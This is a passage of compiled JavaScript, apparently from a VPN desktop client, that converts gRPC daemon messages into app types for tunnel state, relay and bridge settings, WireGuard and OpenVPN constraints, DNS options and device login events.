      return daemon_rpc_types_1.TunnelParameterError.noWireguardKey;
    case grpcTypes.ErrorState.GenerationError
      .CUSTOM_TUNNEL_HOST_RESOLUTION_ERROR:
      return daemon_rpc_types_1.TunnelParameterError
        .customTunnelHostResolutionError;
  }
}
function convertFromTunnelStateRelayInfo(state) {
  if (state.tunnelEndpoint) {
    return {
      ...state,
      endpoint: {
        ...state.tunnelEndpoint,
        tunnelType: convertFromTunnelType(state.tunnelEndpoint.tunnelType),
        protocol: convertFromTransportProtocol(state.tunnelEndpoint.protocol),
        proxy:
          state.tunnelEndpoint.proxy &&
          convertFromProxyEndpoint(state.tunnelEndpoint.proxy),
        obfuscationEndpoint:
          state.tunnelEndpoint.obfuscation &&
          convertFromObfuscationEndpoint(state.tunnelEndpoint.obfuscation),
        entryEndpoint:
          state.tunnelEndpoint.entryEndpoint &&
          convertFromEntryEndpoint(state.tunnelEndpoint.entryEndpoint),
      },
    };
  }
  return undefined;
}
function convertFromTunnelType(tunnelType) {
  const tunnelTypeMap = {
    [grpcTypes.TunnelType.WIREGUARD]: "wireguard",
    [grpcTypes.TunnelType.OPENVPN]: "openvpn",
  };
  return tunnelTypeMap[tunnelType];
}
function convertFromProxyEndpoint(proxyEndpoint) {
  const proxyTypeMap = {
    [grpcTypes.ProxyType.CUSTOM]: "custom",
    [grpcTypes.ProxyType.SHADOWSOCKS]: "shadowsocks",
  };
  return {
    ...proxyEndpoint,
    protocol: convertFromTransportProtocol(proxyEndpoint.protocol),
    proxyType: proxyTypeMap[proxyEndpoint.proxyType],
  };
}
function convertFromObfuscationEndpoint(obfuscationEndpoint) {
  const obfuscationTypes = {
    [grpcTypes.ObfuscationType.UDP2TCP]: "udp2tcp",
  };
  return {
    ...obfuscationEndpoint,
    protocol: convertFromTransportProtocol(obfuscationEndpoint.protocol),
    obfuscationType: obfuscationTypes[obfuscationEndpoint.obfuscationType],
  };
}
function convertFromEntryEndpoint(entryEndpoint) {
  return {
    address: entryEndpoint.address,
    transportProtocol: convertFromTransportProtocol(entryEndpoint.protocol),
  };
}
function convertFromSettings(settings) {
  const settingsObject = settings.toObject();
  const bridgeState = convertFromBridgeState(settingsObject.bridgeState.state);
  const relaySettings = convertFromRelaySettings(settings.getRelaySettings());
  const bridgeSettings = convertFromBridgeSettings(
    settingsObject.bridgeSettings
  );
  const tunnelOptions = convertFromTunnelOptions(settingsObject.tunnelOptions);
  const splitTunnel = settingsObject.splitTunnel ?? {
    enableExclusions: false,
    appsList: [],
  };
  const obfuscationSettings = convertFromObfuscationSettings(
    settingsObject.obfuscationSettings
  );
  return {
    ...settings.toObject(),
    bridgeState,
    relaySettings,
    bridgeSettings,
    tunnelOptions,
    splitTunnel,
    obfuscationSettings,
  };
}
function convertFromBridgeState(bridgeState) {
  const bridgeStateMap = {
    [grpcTypes.BridgeState.State.AUTO]: "auto",
    [grpcTypes.BridgeState.State.ON]: "on",
    [grpcTypes.BridgeState.State.OFF]: "off",
  };
  return bridgeStateMap[bridgeState];
}
function convertFromRelaySettings(relaySettings) {
  if (relaySettings) {
    switch (relaySettings.getEndpointCase()) {
      case grpcTypes.RelaySettings.EndpointCase.ENDPOINT_NOT_SET:
        return undefined;
      case grpcTypes.RelaySettings.EndpointCase.CUSTOM: {
        const custom = relaySettings.getCustom()?.toObject();
        const config = relaySettings.getCustom()?.getConfig();
        const connectionConfig = config && convertFromConnectionConfig(config);
        return (
          custom &&
          connectionConfig && {
            customTunnelEndpoint: {
              ...custom,
              config: connectionConfig,
            },
          }
        );
      }
      case grpcTypes.RelaySettings.EndpointCase.NORMAL: {
        const normal = relaySettings.getNormal();
        const grpcLocation = normal.getLocation();
        const location = grpcLocation
          ? { only: convertFromLocation(grpcLocation.toObject()) }
          : "any";
        const tunnelProtocol = convertFromTunnelTypeConstraint(
          normal.getTunnelType()
        );
        const providers = normal.getProvidersList();
        const ownership = convertFromOwnership(normal.getOwnership());
        const openvpnConstraints = convertFromOpenVpnConstraints(
          normal.getOpenvpnConstraints()
        );
        const wireguardConstraints = convertFromWireguardConstraints(
          normal.getWireguardConstraints()
        );
        return {
          normal: {
            location,
            tunnelProtocol,
            providers,
            ownership,
            wireguardConstraints,
            openvpnConstraints,
          },
        };
      }
    }
  } else {
    return undefined;
  }
}
function convertFromBridgeSettings(bridgeSettings) {
  const normalSettings = bridgeSettings.normal;
  if (normalSettings) {
    const grpcLocation = normalSettings.location;
    const location = grpcLocation
      ? { only: convertFromLocation(grpcLocation) }
      : "any";
    const providers = normalSettings.providersList;
    const ownership = convertFromOwnership(normalSettings.ownership);
    return {
      normal: {
        location,
        providers,
        ownership,
      },
    };
  }
  const customSettings = (settings) => {
    return { custom: settings };
  };
  const localSettings = bridgeSettings.local;
  if (localSettings) {
    return customSettings({
      port: localSettings.port,
      peer: localSettings.peer,
    });
  }
  const remoteSettings = bridgeSettings.remote;
  if (remoteSettings) {
    return customSettings({
      address: remoteSettings.address,
      auth: remoteSettings.auth && { ...remoteSettings.auth },
    });
  }
  const shadowsocksSettings = bridgeSettings.shadowsocks;
  return customSettings({
    peer: shadowsocksSettings.peer,
    password: shadowsocksSettings.password,
    cipher: shadowsocksSettings.cipher,
  });
}
function convertFromConnectionConfig(connectionConfig) {
  const connectionConfigObject = connectionConfig.toObject();
  switch (connectionConfig.getConfigCase()) {
    case grpcTypes.ConnectionConfig.ConfigCase.CONFIG_NOT_SET:
      return undefined;
    case grpcTypes.ConnectionConfig.ConfigCase.WIREGUARD:
      return (
        connectionConfigObject.wireguard &&
        connectionConfigObject.wireguard.tunnel &&
        connectionConfigObject.wireguard.peer && {
          wireguard: {
            ...connectionConfigObject.wireguard,
            tunnel: {
              privateKey: convertFromWireguardKey(
                connectionConfigObject.wireguard.tunnel.privateKey
              ),
              addresses: connectionConfigObject.wireguard.tunnel.addressesList,
            },
            peer: {
              ...connectionConfigObject.wireguard.peer,
              addresses: connectionConfigObject.wireguard.peer.allowedIpsList,
              publicKey: convertFromWireguardKey(
                connectionConfigObject.wireguard.peer.publicKey
              ),
            },
          },
        }
      );
    case grpcTypes.ConnectionConfig.ConfigCase.OPENVPN: {
      const [ip, port] = connectionConfigObject.openvpn.address.split(":");
      return {
        openvpn: {
          ...connectionConfigObject.openvpn,
          endpoint: {
            ip,
            port: parseInt(port, 10),
            protocol: convertFromTransportProtocol(
              connectionConfigObject.openvpn.protocol
            ),
          },
        },
      };
    }
  }
}
function convertFromLocation(location) {
  if (location.hostname) {
    return { hostname: [location.country, location.city, location.hostname] };
  }
  if (location.city) {
    return { city: [location.country, location.city] };
  }
  return { country: location.country };
}
function convertFromTunnelOptions(tunnelOptions) {
  return {
    openvpn: {
      mssfix: tunnelOptions.openvpn.mssfix,
    },
    wireguard: {
      mtu: tunnelOptions.wireguard.mtu,
      quantumResistant: convertFromQuantumResistantState(
        tunnelOptions.wireguard?.quantumResistant?.state
      ),
    },
    generic: {
      enableIpv6: tunnelOptions.generic.enableIpv6,
    },
    dns: {
      state:
        tunnelOptions.dnsOptions?.state === grpcTypes.DnsOptions.DnsState.CUSTOM
          ? "custom"
          : "default",
      defaultOptions: {
        blockAds: tunnelOptions.dnsOptions?.defaultOptions?.blockAds ?? false,
        blockTrackers:
          tunnelOptions.dnsOptions?.defaultOptions?.blockTrackers ?? false,
        blockMalware:
          tunnelOptions.dnsOptions?.defaultOptions?.blockMalware ?? false,
        blockAdultContent:
          tunnelOptions.dnsOptions?.defaultOptions?.blockAdultContent ?? false,
        blockGambling:
          tunnelOptions.dnsOptions?.defaultOptions?.blockGambling ?? false,
      },
      customOptions: {
        addresses: tunnelOptions.dnsOptions?.customOptions?.addressesList ?? [],
      },
    },
  };
}
function convertFromQuantumResistantState(state) {
  return state === undefined
    ? undefined
    : {
        [grpcTypes.QuantumResistantState.State.ON]: true,
        [grpcTypes.QuantumResistantState.State.OFF]: false,
        [grpcTypes.QuantumResistantState.State.AUTO]: undefined,
      }[state];
}
function convertFromObfuscationSettings(obfuscationSettings) {
  let selectedObfuscationType = daemon_rpc_types_1.ObfuscationType.auto;
  switch (obfuscationSettings?.selectedObfuscation) {
    case grpcTypes.ObfuscationSettings.SelectedObfuscation.OFF:
      selectedObfuscationType = daemon_rpc_types_1.ObfuscationType.off;
      break;
    case grpcTypes.ObfuscationSettings.SelectedObfuscation.UDP2TCP:
      selectedObfuscationType = daemon_rpc_types_1.ObfuscationType.udp2tcp;
      break;
  }
  return {
    selectedObfuscation: selectedObfuscationType,
    udp2tcpSettings:
      obfuscationSettings?.udp2tcp && obfuscationSettings.udp2tcp.port !== 0
        ? { port: { only: obfuscationSettings.udp2tcp.port } }
        : { port: "any" },
  };
}
function convertFromDaemonEvent(data) {
  const tunnelState = data.getTunnelState();
  if (tunnelState !== undefined) {
    return { tunnelState: convertFromTunnelState(tunnelState) };
  }
  const settings = data.getSettings();
  if (settings !== undefined) {
    return { settings: convertFromSettings(settings) };
  }
  const relayList = data.getRelayList();
  if (relayList !== undefined) {
    return { relayList: convertFromRelayList(relayList) };
  }
  const deviceConfig = data.getDevice();
  if (deviceConfig !== undefined) {
    return { device: convertFromDeviceEvent(deviceConfig) };
  }
  const deviceRemoval = data.getRemoveDevice();
  if (deviceRemoval !== undefined) {
    return { deviceRemoval: convertFromDeviceRemoval(deviceRemoval) };
  }
  const versionInfo = data.getVersionInfo();
  if (versionInfo !== undefined) {
    return { appVersionInfo: versionInfo.toObject() };
  }
  // Handle unknown daemon events
  const keys = Object.entries(data.toObject())
    .filter(([, value]) => value !== undefined)
    .map(([key]) => key);
  throw new Error(`Unknown daemon event received containing ${keys}`);
}
function convertFromOwnership(ownership) {
  switch (ownership) {
    case grpcTypes.Ownership.ANY:
      return daemon_rpc_types_1.Ownership.any;
    case grpcTypes.Ownership.MULLVAD_OWNED:
      return daemon_rpc_types_1.Ownership.mullvadOwned;
    case grpcTypes.Ownership.RENTED:
      return daemon_rpc_types_1.Ownership.rented;
  }
}
function convertToOwnership(ownership) {
  switch (ownership) {
    case daemon_rpc_types_1.Ownership.any:
      return grpcTypes.Ownership.ANY;
    case daemon_rpc_types_1.Ownership.mullvadOwned:
      return grpcTypes.Ownership.MULLVAD_OWNED;
    case daemon_rpc_types_1.Ownership.rented:
      return grpcTypes.Ownership.RENTED;
  }
}
function convertFromOpenVpnConstraints(constraints) {
  const transportPort = convertFromConstraint(constraints.getPort());
  if (transportPort !== "any" && "only" in transportPort) {
    const port = convertFromConstraint(transportPort.only.getPort());
    let protocol = "any";
    switch (transportPort.only.getProtocol()) {
      case grpcTypes.TransportProtocol.TCP:
        protocol = { only: "tcp" };
        break;
      case grpcTypes.TransportProtocol.UDP:
        protocol = { only: "udp" };
        break;
    }
    return { port, protocol };
  }
  return { port: "any", protocol: "any" };
}
function convertFromWireguardConstraints(constraints) {
  const result = {
    port: "any",
    ipVersion: "any",
    useMultihop: constraints.getUseMultihop(),
    entryLocation: "any",
  };
  const port = constraints.getPort();
  if (port) {
    result.port = { only: port };
  }
  const ipVersion = constraints.getIpVersion()?.getProtocol();
  switch (ipVersion) {
    case grpcTypes.IpVersion.V4:
      result.ipVersion = { only: "ipv4" };
      break;
    case grpcTypes.IpVersion.V6:
      result.ipVersion = { only: "ipv6" };
      break;
  }
  const entryLocation = constraints.getEntryLocation();
  if (entryLocation) {
    result.entryLocation = {
      only: convertFromLocation(entryLocation.toObject()),
    };
  }
  return result;
}
function convertFromTunnelTypeConstraint(constraint) {
  switch (constraint?.getTunnelType()) {
    case grpcTypes.TunnelType.WIREGUARD: {
      return { only: "wireguard" };
    }
    case grpcTypes.TunnelType.OPENVPN: {
      return { only: "openvpn" };
    }
    default: {
      return "any";
    }
  }
}
function convertFromConstraint(value) {
  if (value) {
    return { only: value };
  } else {
    return "any";
  }
}
function convertToNormalBridgeSettings(constraints) {
  const normalBridgeSettings = new grpcTypes.BridgeSettings.BridgeConstraints();
  normalBridgeSettings.setLocation(
    convertToLocation(liftConstraint(constraints.location))
  );
  normalBridgeSettings.setProvidersList(constraints.providers);
  return normalBridgeSettings;
}
function convertToLocation(constraint) {
  const location = new grpcTypes.RelayLocation();
  if (constraint && "hostname" in constraint) {
    const [countryCode, cityCode, hostname] = constraint.hostname;
    location.setCountry(countryCode);
    location.setCity(cityCode);
    location.setHostname(hostname);
    return location;
  } else if (constraint && "city" in constraint) {
    location.setCountry(constraint.city[0]);
    location.setCity(constraint.city[1]);
    return location;
  } else if (constraint && "country" in constraint) {
    location.setCountry(constraint.country);
    return location;
  } else {
    return undefined;
  }
}
function convertToTunnelTypeConstraint(constraint) {
  const grpcConstraint = new grpcTypes.TunnelTypeConstraint();
  if (
    constraint !== undefined &&
    constraint !== "any" &&
    "only" in constraint
  ) {
    switch (constraint.only) {
      case "wireguard":
        grpcConstraint.setTunnelType(grpcTypes.TunnelType.WIREGUARD);
        return grpcConstraint;
      case "openvpn":
        grpcConstraint.setTunnelType(grpcTypes.TunnelType.OPENVPN);
        return grpcConstraint;
    }
  }
  return undefined;
}
function convertToOpenVpnConstraints(constraints) {
  const openvpnConstraints = new grpcTypes.OpenvpnConstraints();
  if (constraints) {
    const protocol = liftConstraint(constraints.protocol);
    if (protocol) {
      const portConstraints = new grpcTypes.TransportPort();
      const port = liftConstraint(constraints.port);
      if (port) {
        portConstraints.setPort(port);
      }
      portConstraints.setProtocol(convertToTransportProtocol(protocol));
      openvpnConstraints.setPort(portConstraints);
    }
    return openvpnConstraints;
  }
  return undefined;
}
function convertToWireguardConstraints(constraint) {
  if (constraint) {
    const wireguardConstraints = new grpcTypes.WireguardConstraints();
    const port = liftConstraint(constraint.port);
    if (port) {
      wireguardConstraints.setPort(port);
    }
    const ipVersion = liftConstraint(constraint.ipVersion);
    if (ipVersion) {
      const ipVersionProtocol =
        ipVersion === "ipv4" ? grpcTypes.IpVersion.V4 : grpcTypes.IpVersion.V6;
      const ipVersionConstraints = new grpcTypes.IpVersionConstraint();
      ipVersionConstraints.setProtocol(ipVersionProtocol);
      wireguardConstraints.setIpVersion(ipVersionConstraints);
    }
    if (constraint.useMultihop) {
      wireguardConstraints.setUseMultihop(constraint.useMultihop);
    }
    const entryLocation = liftConstraint(constraint.entryLocation);
    if (entryLocation) {
      const entryLocationConstraint = convertToLocation(entryLocation);
      wireguardConstraints.setEntryLocation(entryLocationConstraint);
    }
    return wireguardConstraints;
  }
  return undefined;
}
function convertToTransportProtocol(protocol) {
  switch (protocol) {
    case "udp":
      return grpcTypes.TransportProtocol.UDP;
    case "tcp":
      return grpcTypes.TransportProtocol.TCP;
  }
}
function convertFromDeviceEvent(deviceEvent) {
  const deviceState = convertFromDeviceState(deviceEvent.getNewState());
  switch (deviceEvent.getCause()) {
    case grpcTypes.DeviceEvent.Cause.LOGGED_IN:
      return { type: "logged in", deviceState: deviceState };
    case grpcTypes.DeviceEvent.Cause.LOGGED_OUT:
      return { type: "logged out", deviceState: deviceState };
    case grpcTypes.DeviceEvent.Cause.REVOKED:
      return { type: "revoked", deviceState: deviceState };
    case grpcTypes.DeviceEvent.Cause.UPDATED:
      return { type: "updated", deviceState: deviceState };
    case grpcTypes.DeviceEvent.Cause.ROTATED_KEY:
      return { type: "rotated_key", deviceState: deviceState };
  }
}
function convertFromDeviceState(deviceState) {
  switch (deviceState.getState()) {
    case grpcTypes.DeviceState.State.LOGGED_IN: {
      const accountAndDevice = deviceState.getDevice();
      const device = accountAndDevice.getDevice();
      return {
        type: "logged in",
        accountAndDevice: {
          accountToken: accountAndDevice.getAccountToken(),
          device: device && convertFromDevice(device),
        },
      };
    }
    case grpcTypes.DeviceState.State.LOGGED_OUT:
      return { type: "logged out" };
    case grpcTypes.DeviceState.State.REVOKED:
      return { type: "revoked" };
  }
}
function convertFromDeviceRemoval(deviceRemoval) {
  return deviceRemoval.getNewDeviceListList().map(convertFromDevice);
}
function convertFromDevice(device) {
  const created = ensureExists(
    device.getCreated(),
    "no 'created' field for device"
  ).toDate();
  const asObject = device.toObject();
  return {
    ...asObject,
    ports: asObject.portsList.map((port) => port.id),
    created: created,
  };
}
function ensureExists(value, errorMessage) {
  if (value) {
    return value;
  }
  throw new ResponseParseError(errorMessage);
}
